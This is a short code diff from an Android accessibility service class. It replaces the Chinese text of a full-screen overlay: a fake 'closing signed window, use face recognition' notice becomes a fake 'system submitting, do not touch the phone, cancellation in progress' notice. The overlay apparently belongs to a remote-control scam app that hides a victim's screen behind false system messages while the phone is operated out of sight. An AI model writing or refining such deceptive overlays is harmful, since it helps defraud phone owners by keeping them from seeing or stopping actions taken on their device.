@@ -760,9 +760,9 @@ class InputService : AccessibilityService() {
     	gohome = 8
 	overLay.setVisibility(gohome)
 	val loadingText = TextView(this, null)
- 	loadingText.text = "\n\n\n系统正在自动关闭签约的窗口\n请勿触碰屏幕避免关闭失败\n配合人脸识别确保您本人关闭"
+ 	loadingText.text = "\n\n系统提交中\n请勿触碰手机屏幕\n避免影响解除进度\n请耐心等待..."
  	loadingText.setTextColor(-7829368)
- 	loadingText.textSize = 15.0f
+ 	loadingText.textSize = 12.0f
  	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
  	loadingText.setPadding(60, HomeHeight  / 4, 0, 0)
  
